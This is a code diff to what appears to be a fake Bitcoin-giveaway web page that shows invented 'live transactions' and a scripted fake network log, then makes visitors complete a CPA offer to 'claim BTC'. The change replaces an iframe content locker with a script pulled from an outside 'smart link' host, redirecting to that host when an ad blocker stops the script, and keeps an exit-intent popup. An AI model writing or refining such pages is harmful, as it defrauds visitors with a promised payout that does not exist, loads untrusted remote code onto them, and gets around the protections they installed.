@@ -103,6 +103,15 @@
             animation: spin 1s linear infinite;
         }
 
+        .btn-loader {
+            border: 2px solid #000;
+            border-left-color: transparent;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+        }
+
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
@@ -215,7 +224,7 @@
 
                 <p class="text-gray-300 mb-8">Complete one offer to confirm your transaction.</p>
 
-                <button onclick="verifyUser()" class="group w-full bg-green-500 hover:bg-green-400 text-black font-bold py-4 rounded-lg transform hover:scale-[1.02] transition-all duration-200 shadow-lg shadow-green-500/20 relative overflow-hidden">
+                <button id="verify-btn" onclick="verifyUser()" class="group w-full bg-green-500 hover:bg-green-400 text-black font-bold py-4 rounded-lg transform hover:scale-[1.02] transition-all duration-200 shadow-lg shadow-green-500/20 relative overflow-hidden">
                     <span class="relative z-10 flex items-center justify-center gap-2">
                         Verify & Claim BTC <i class="fa-solid fa-unlock group-hover:translate-x-1 transition-transform"></i>
                     </span>
@@ -355,9 +364,8 @@
 
     <script>
         // --- CONFIGURATION ---
-        const transactionDelay = 4500; // ms between fake transactions
-        let processInterval;
-
+        const transactionDelay = 4500;
+        
         // --- DOM ELEMENTS ---
         const mainInterface = document.getElementById('main-interface');
         const processingInterface = document.getElementById('processing-interface');
@@ -371,23 +379,19 @@
         function startProcessing() {
             const wallet = walletInput.value;
             
-            // Simple validation
             if(wallet.length < 10) {
                 walletInput.style.borderColor = 'red';
                 setTimeout(() => walletInput.style.borderColor = '#374151', 1000);
                 return;
             }
 
-            // Switch UI
             mainInterface.classList.add('hidden');
             processingInterface.classList.remove('hidden');
 
-            // Start Progress Bar
             setTimeout(() => {
                 progressBar.style.width = '100%';
             }, 100);
 
-            // Console Simulation Sequence
             const logs = [
                 { text: `> Connecting to node 104.23.xx...`, delay: 500 },
                 { text: `> Handshake successful.`, delay: 1000 },
@@ -399,12 +403,10 @@
 
             let logIndex = 0;
             
-            // Status Text Updates
             setTimeout(() => { statusText.innerText = "Verifying Wallet Address..."; }, 1000);
             setTimeout(() => { statusText.innerText = "Securing Payout..."; }, 2000);
             setTimeout(() => { statusText.innerText = "Finalizing Transaction..."; }, 2800);
 
-            // Log printer
             const logInterval = setInterval(() => {
                 if (logIndex < logs.length) {
                     const div = document.createElement('div');
@@ -415,8 +417,6 @@
                     logIndex++;
                 } else {
                     clearInterval(logInterval);
-                    
-                    // Switch to Verification Screen
                     setTimeout(() => {
                         processingInterface.classList.add('hidden');
                         verificationInterface.classList.remove('hidden');
@@ -425,31 +425,35 @@
             }, 500);
         }
 
-        // --- 2. VERIFY USER FUNCTION (Injects Iframe) ---
+        // --- 2. VERIFY USER FUNCTION (SMART LINK FIX) ---
         function verifyUser() {
-            console.log("Creating Locker Iframe...");
+            const btn = document.getElementById('verify-btn');
             
-            var locker = document.createElement("iframe");
+            // تبديل شكل الزر باش يبان كيتسنى
+            if(btn) {
+                btn.innerHTML = `<span class="relative z-10 flex items-center justify-center gap-2"><div class="btn-loader"></div> Loading...</span>`;
+                btn.classList.remove('bg-green-500', 'hover:bg-green-400');
+                btn.classList.add('bg-gray-500', 'cursor-not-allowed');
+                btn.disabled = true;
+            }
+
+            // الطريقة الصحيحة باش نخدمو السكريبت ديال الـ CPA
+            var script = document.createElement('script');
+            script.type = 'text/javascript';
+            script.src = "https://quikfun.info/sl/ppzny";
             
-            // Using srcdoc to properly render the script tag inside the iframe
-            // HERE IS YOUR SMART LINK INJECTED CORRECTLY
-            locker.srcdoc = `
-                <html>
-                    <body style="margin:0; padding:0; background: transparent;">
-                        <script src="https://quikfun.info/sl/ppzny"><\\/script>
-                    </body>
-                </html>
-            `;
+            // إلى السكريبت تخدم مزيان
+            script.onload = function() {
+                console.log("CPA Script loaded");
+            };
             
-            locker.style.position = "fixed";
-            locker.style.top = "0";
-            locker.style.left = "0";
-            locker.style.width = "100%";
-            locker.style.height = "100%";
-            locker.style.border = "none";
-            locker.style.zIndex = "999999";
-            
-            document.body.appendChild(locker);
+            // إلى كان شي Adblocker مانع السكريبت، كيحول الزائر مباشرة للرابط باش ما يضيعش
+            script.onerror = function() {
+                console.log("Script blocked, redirecting to direct link...");
+                window.location.href = "https://quikfun.info/sl/ppzny";
+            };
+
+            document.body.appendChild(script);
         }
 
         // --- 3. LIVE TRANSACTIONS GENERATOR ---
@@ -483,14 +487,12 @@
 
             transactionList.prepend(row);
 
-            // Keep list clean (max 5 items)
             if (transactionList.children.length > 5) {
                 transactionList.removeChild(transactionList.lastChild);
             }
         }
 
-        // Initialize Transactions
-        for(let i=0; i<3; i++) addTransaction(); // Add initial data
+        for(let i=0; i<3; i++) addTransaction();
         setInterval(addTransaction, transactionDelay);
 
         // --- 4. ANTI-EXIT INTENT ---
@@ -498,17 +500,11 @@
         const popupContent = document.getElementById('popup-content');
         let exitTriggered = false;
 
-        // Desktop: Mouse leaves window upwards
         document.addEventListener('mouseleave', (e) => {
-            if (e.clientY < 0 && !exitTriggered) showPopup();
-        });
-
-        // Mobile: Show after 15 seconds if no action
-        setTimeout(() => {
-            if (!exitTriggered && mainInterface.classList.contains('hidden') === false) {
-               // showPopup();
+            if (e.clientY < 0 && !exitTriggered && mainInterface.classList.contains('hidden') === false) {
+                showPopup();
             }
-        }, 15000);
+        });
 
         function showPopup() {
             exitTriggered = true;
@@ -528,7 +524,6 @@
                 exitPopup.classList.add('hidden');
             }, 300);
         }
-
     </script>
 </body>
 </html>
